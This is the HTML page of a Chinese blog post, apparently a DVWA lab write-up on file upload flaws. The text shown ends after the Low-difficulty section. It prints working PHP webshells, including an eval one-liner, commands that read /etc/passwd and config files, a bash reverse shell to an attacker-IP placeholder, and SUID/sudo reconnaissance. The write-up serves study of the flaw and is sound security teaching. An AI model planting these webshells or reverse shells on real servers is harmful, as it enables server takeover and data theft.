@@ -1,0 +1,941 @@
+<!DOCTYPE html>
+<html lang="en,zh-CN,default">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.1.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/fancybox/2.1.5/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/undefined/pace/pace-theme-pace-theme-center-atom.min.css">
+  <script src="/undefined/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"caixuya.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"hide","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":false,"nav":null},"algolia":{"appID":"B5HBQCBE1B","apiKey":"ea181e93e7b10c0d94c8e758b7eb25ab","indexName":"hexo","hits":{"per_page":10},"labels":{"input_placeholder":"输入关键字","hits_empty":"没有找到与「${query}」相关的内容","hits_stats":"${hits}条相关记录，共耗时 ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":false,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是文件上传漏洞（File Upload Vulnerability）？文件上传漏洞是指Web应用程序没有对上传的文件进行严格验证，允许攻击者上传恶意文件并执行。 危害：  上传WebShell获取服务器控制权 上传病毒木马 覆盖重要文件 造成拒绝服务（上传大文件） 钓鱼攻击（上传">
+<meta property="og:type" content="article">
+<meta property="og:title" content="DVWA - File Upload (文件上传) 攻防练习详解">
+<meta property="og:url" content="http://caixuya.github.io/2025/11/20/File_Upload_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/index.html">
+<meta property="og:site_name" content="tia的学习笔记">
+<meta property="og:description" content="目录 漏洞简介 Low 难度 Medium 难度 High 难度 Impossible 难度 防御建议   漏洞简介什么是文件上传漏洞（File Upload Vulnerability）？文件上传漏洞是指Web应用程序没有对上传的文件进行严格验证，允许攻击者上传恶意文件并执行。 危害：  上传WebShell获取服务器控制权 上传病毒木马 覆盖重要文件 造成拒绝服务（上传大文件） 钓鱼攻击（上传">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2025-11-20T15:31:37.109Z">
+<meta property="article:modified_time" content="2025-11-20T15:27:58.042Z">
+<meta property="article:author" content="caixuya">
+<meta name="twitter:card" content="summary">
+
+<link rel="canonical" href="http://caixuya.github.io/2025/11/20/File_Upload_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+
+  <title>DVWA - File Upload (文件上传) 攻防练习详解 | tia的学习笔记</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="tia的学习笔记" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">tia的学习笔记</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-主页">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a>
+
+  </li>
+        <li class="menu-item menu-item-分类">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-目录">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>目录</a>
+
+  </li>
+        <li class="menu-item menu-item-站点地图">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+        <li class="menu-item menu-item-关于我">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于我</a>
+
+  </li>
+        <li class="menu-item menu-item-开往">
+
+    <a href="/travelling/" rel="section"><i class="fa fa-paper-plane fa-fw"></i>开往</a>
+
+  </li>
+        <li class="menu-item menu-item-给我写信">
+
+    <a href="http://mail.qq.com/cgi-bin/qm_share?t=qm_mailme&email=vY_MiY2FhI2Ojf3MzJPe0tA" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>给我写信</a>
+
+  </li>
+        <li class="menu-item menu-item-公益404">
+
+    <a href="/404/" rel="section"><i class="fa fa-heartbeat fa-fw"></i>公益404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>Search
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container"></div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="algolia-results">
+  <div id="algolia-stats"></div>
+  <div id="algolia-hits"></div>
+  <div id="algolia-pagination" class="algolia-pagination"></div>
+</div>
+
+      
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="http://caixuya.github.io/2025/11/20/File_Upload_%E6%94%BB%E9%98%B2%E7%BB%83%E4%B9%A0/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="caixuya">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="tia的学习笔记">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          DVWA - File Upload (文件上传) 攻防练习详解
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2025-11-20 23:31:37 / Modified: 23:27:58" itemprop="dateCreated datePublished" datetime="2025-11-20T23:31:37+08:00">2025-11-20</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/dvwa%E9%9D%B6%E5%9C%BA%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" itemprop="url" rel="index"><span itemprop="name">dvwa靶场学习笔记</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="Symbols count in article">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>16k</span>
+            </span>
+            <span class="post-meta-item" title="Reading time">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>14 mins.</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id=""><a href="#" class="headerlink" title=""></a></h1><h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ul>
+<li><a href="#%E6%BC%8F%E6%B4%9E%E7%AE%80%E4%BB%8B">漏洞简介</a></li>
+<li><a href="#low-%E9%9A%BE%E5%BA%A6">Low 难度</a></li>
+<li><a href="#medium-%E9%9A%BE%E5%BA%A6">Medium 难度</a></li>
+<li><a href="#high-%E9%9A%BE%E5%BA%A6">High 难度</a></li>
+<li><a href="#impossible-%E9%9A%BE%E5%BA%A6">Impossible 难度</a></li>
+<li><a href="#%E9%98%B2%E5%BE%A1%E5%BB%BA%E8%AE%AE">防御建议</a></li>
+</ul>
+<hr>
+<h2 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h2><h3 id="什么是文件上传漏洞（File-Upload-Vulnerability）？"><a href="#什么是文件上传漏洞（File-Upload-Vulnerability）？" class="headerlink" title="什么是文件上传漏洞（File Upload Vulnerability）？"></a>什么是文件上传漏洞（File Upload Vulnerability）？</h3><p>文件上传漏洞是指Web应用程序没有对上传的文件进行严格验证，允许攻击者上传恶意文件并执行。</p>
+<p><strong>危害：</strong></p>
+<ul>
+<li>上传WebShell获取服务器控制权</li>
+<li>上传病毒木马</li>
+<li>覆盖重要文件</li>
+<li>造成拒绝服务（上传大文件）</li>
+<li>钓鱼攻击（上传假页面）</li>
+<li>XSS攻击（上传HTML文件）</li>
+</ul>
+<p><strong>攻击流程：</strong></p>
+<ol>
+<li>上传恶意PHP文件（WebShell）</li>
+<li>访问上传的文件</li>
+<li>执行任意系统命令</li>
+<li>完全控制服务器</li>
+</ol>
+<p><strong>常见场景：</strong></p>
+<ul>
+<li>头像上传</li>
+<li>文档上传</li>
+<li>图片上传</li>
+<li>附件上传</li>
+</ul>
+<hr>
+<h2 id="Low-难度"><a href="#Low-难度" class="headerlink" title="Low 难度"></a>Low 难度</h2><h3 id="攻击目标"><a href="#攻击目标" class="headerlink" title="攻击目标"></a>攻击目标</h3><p>无任何验证的文件上传，直接获取WebShell。</p>
+<h3 id="后端代码分析"><a href="#后端代码分析" class="headerlink" title="后端代码分析"></a>后端代码分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查是否提交了上传表单</span></span><br><span class="line"><span class="comment">// isset() - 检查变量是否存在</span></span><br><span class="line"><span class="comment">// $_POST[&#x27;Upload&#x27;] - 上传按钮</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 定义上传目录 ★★★</span></span><br><span class="line">    <span class="comment">// __DIR__ - 当前文件所在目录的绝对路径</span></span><br><span class="line">    <span class="comment">// DIRECTORY_SEPARATOR - 目录分隔符（Windows: \, Linux: /）</span></span><br><span class="line">    <span class="comment">// uploads/ - 上传文件存储目录</span></span><br><span class="line">    <span class="variable">$target_path</span>  = <span class="keyword">__DIR__</span> . DIRECTORY_SEPARATOR . <span class="string">&#x27;uploads/&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 危险操作：直接使用用户上传的文件名 ★★★</span></span><br><span class="line">    <span class="comment">// basename() - 返回路径中的文件名部分</span></span><br><span class="line">    <span class="comment">// $_FILES[&#x27;uploaded&#x27;][&#x27;name&#x27;] - 用户上传文件的原始文件名</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// 问题：</span></span><br><span class="line">    <span class="comment">// 1. 不检查文件扩展名（允许.php）</span></span><br><span class="line">    <span class="comment">// 2. 不检查文件内容</span></span><br><span class="line">    <span class="comment">// 3. 不检查MIME类型</span></span><br><span class="line">    <span class="comment">// 4. 不重命名文件</span></span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 直接移动上传的文件到目标目录 ★★★</span></span><br><span class="line">    <span class="comment">// move_uploaded_file() - 将上传的文件移动到新位置</span></span><br><span class="line">    <span class="comment">// 参数1：$_FILES[&#x27;uploaded&#x27;][&#x27;tmp_name&#x27;] - 临时文件路径</span></span><br><span class="line">    <span class="comment">// 参数2：目标路径</span></span><br><span class="line">    <span class="comment">// 返回值：成功返回true，失败返回false</span></span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="comment">// $_FILES数组结构：</span></span><br><span class="line">    <span class="comment">// [&#x27;name&#x27;]     - 原始文件名</span></span><br><span class="line">    <span class="comment">// [&#x27;type&#x27;]     - MIME类型（客户端提供，不可信）</span></span><br><span class="line">    <span class="comment">// [&#x27;tmp_name&#x27;] - 服务器临时文件路径</span></span><br><span class="line">    <span class="comment">// [&#x27;error&#x27;]    - 错误代码</span></span><br><span class="line">    <span class="comment">// [&#x27;size&#x27;]     - 文件大小（字节）</span></span><br><span class="line">    <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ], <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 上传失败</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 上传成功，显示文件路径 ★★★</span></span><br><span class="line">        <span class="comment">// 问题：直接显示路径，方便攻击者访问恶意文件</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p><strong>核心问题：</strong></p>
+<ol>
+<li><strong>无文件类型检查</strong> - 允许上传.php文件</li>
+<li><strong>无文件内容检查</strong> - 不验证文件实际内容</li>
+<li><strong>无MIME类型检查</strong> - 不检查Content-Type</li>
+<li><strong>使用原始文件名</strong> - 不重命名文件</li>
+<li><strong>暴露文件路径</strong> - 显示上传路径</li>
+</ol>
+<p><strong>攻击流程：</strong></p>
+<figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="bullet">1.</span> 创建shell.php（WebShell）</span><br><span class="line"><span class="bullet">2.</span> 上传shell.php</span><br><span class="line"><span class="bullet">3.</span> 访问 uploads/shell.php</span><br><span class="line"><span class="bullet">4.</span> 执行系统命令</span><br><span class="line"><span class="bullet">5.</span> 完全控制服务器</span><br></pre></td></tr></table></figure>
+
+<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><h4 id="步骤1：创建简单WebShell"><a href="#步骤1：创建简单WebShell" class="headerlink" title="步骤1：创建简单WebShell"></a>步骤1：创建简单WebShell</h4><p><strong>最简单的WebShell（shell.php）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 执行GET参数中的cmd命令</span></span><br><span class="line"><span class="comment">// system() - 执行系统命令并输出结果</span></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用方法：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>dvwa.local<span class="regexp">/dvwa/</span>hackable<span class="regexp">/uploads/</span>shell.php?cmd=whoami</span><br><span class="line">http:<span class="regexp">//</span>dvwa.local<span class="regexp">/dvwa/</span>hackable<span class="regexp">/uploads/</span>shell.php?cmd=ls -la</span><br><span class="line">http:<span class="regexp">//</span>dvwa.local<span class="regexp">/dvwa/</span>hackable<span class="regexp">/uploads/</span>shell.php?cmd=cat <span class="regexp">/etc/</span>passwd</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤2：创建功能完整的WebShell"><a href="#步骤2：创建功能完整的WebShell" class="headerlink" title="步骤2：创建功能完整的WebShell"></a>步骤2：创建功能完整的WebShell</h4><p><strong>一句话木马：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>使用中国菜刀、蚁剑等工具连接</strong></p>
+<p><strong>完整WebShell（webshell.php）：</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 功能完整的WebShell</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;WebShell&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;WebShell&lt;/h1&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;System Information&lt;/h2&gt;</span><br><span class="line">    &lt;pre&gt;</span><br><span class="line">    OS: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> PHP_OS; <span class="meta">?&gt;</span></span><br><span class="line">    PHP Version: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">phpversion</span>(); <span class="meta">?&gt;</span></span><br><span class="line">    Server: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>]; <span class="meta">?&gt;</span></span><br><span class="line">    Document Root: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_SERVER</span>[<span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>]; <span class="meta">?&gt;</span></span><br><span class="line">    Current User: <span class="meta">&lt;?php</span> <span class="keyword">echo</span> <span class="title function_ invoke__">get_current_user</span>(); <span class="meta">?&gt;</span></span><br><span class="line">    &lt;/pre&gt;</span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;Command Execution&lt;/h2&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;cmd&quot;</span> placeholder=<span class="string">&quot;Enter command&quot;</span> style=<span class="string">&quot;width:500px;&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span>&gt;Execute&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;h3&gt;Output:&lt;/h3&gt;&#x27;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">    &lt;h2&gt;File Manager&lt;/h2&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;POST&quot;</span>&gt;</span><br><span class="line">        &lt;input type=<span class="string">&quot;text&quot;</span> name=<span class="string">&quot;path&quot;</span> value=<span class="string">&quot;&lt;?php echo getcwd(); ?&gt;&quot;</span> style=<span class="string">&quot;width:500px;&quot;</span>&gt;</span><br><span class="line">        &lt;button type=<span class="string">&quot;submit&quot;</span> name=<span class="string">&quot;list&quot;</span>&gt;List&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line"></span><br><span class="line">    <span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;list&#x27;</span>])) &#123;</span><br><span class="line">        <span class="variable">$path</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;path&#x27;</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;&#x27;</span>;</span><br><span class="line">        <span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="variable">$path</span>);</span><br><span class="line">        <span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$file</span> . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">?&gt;</span></span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤3：上传WebShell"><a href="#步骤3：上传WebShell" class="headerlink" title="步骤3：上传WebShell"></a>步骤3：上传WebShell</h4><ol>
+<li>在DVWA的File Upload页面</li>
+<li>选择shell.php文件</li>
+<li>点击Upload</li>
+<li>记录显示的文件路径</li>
+</ol>
+<h4 id="步骤4：访问WebShell"><a href="#步骤4：访问WebShell" class="headerlink" title="步骤4：访问WebShell"></a>步骤4：访问WebShell</h4><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>dvwa.local<span class="regexp">/dvwa/</span>hackable<span class="regexp">/uploads/</span>shell.php?cmd=whoami</span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤5：执行系统命令"><a href="#步骤5：执行系统命令" class="headerlink" title="步骤5：执行系统命令"></a>步骤5：执行系统命令</h4><p><strong>查看当前目录：</strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">pwd</span></span></span><br></pre></td></tr></table></figure>
+
+<p><strong>列出文件：</strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">ls</span> -la</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>读取敏感文件：</strong></p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">cat</span> /etc/passwd</span></span><br><span class="line">?<span class="keyword">cmd</span><span class="language-bash">=<span class="built_in">cat</span> ../../config/config.inc.php</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>反弹Shell：</strong></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?cmd=bash -i &gt;&amp; <span class="regexp">/dev/</span>tcp<span class="regexp">/攻击者IP/</span><span class="number">4444</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 攻击者监听</span></span><br><span class="line">nc -lvp <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<h4 id="步骤6：权限提升"><a href="#步骤6：权限提升" class="headerlink" title="步骤6：权限提升"></a>步骤6：权限提升</h4><p><strong>查找SUID文件：</strong></p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?cmd=<span class="built_in">find</span> / -perm <span class="number">-4000</span> <span class="number">2</span>&gt;<span class="regexp">/dev/</span><span class="literal">null</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>查看sudo权限：</strong></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?<span class="attribute">cmd</span>=sudo -l</span><br></pre></td></tr></table></figure>
+
+<hr>
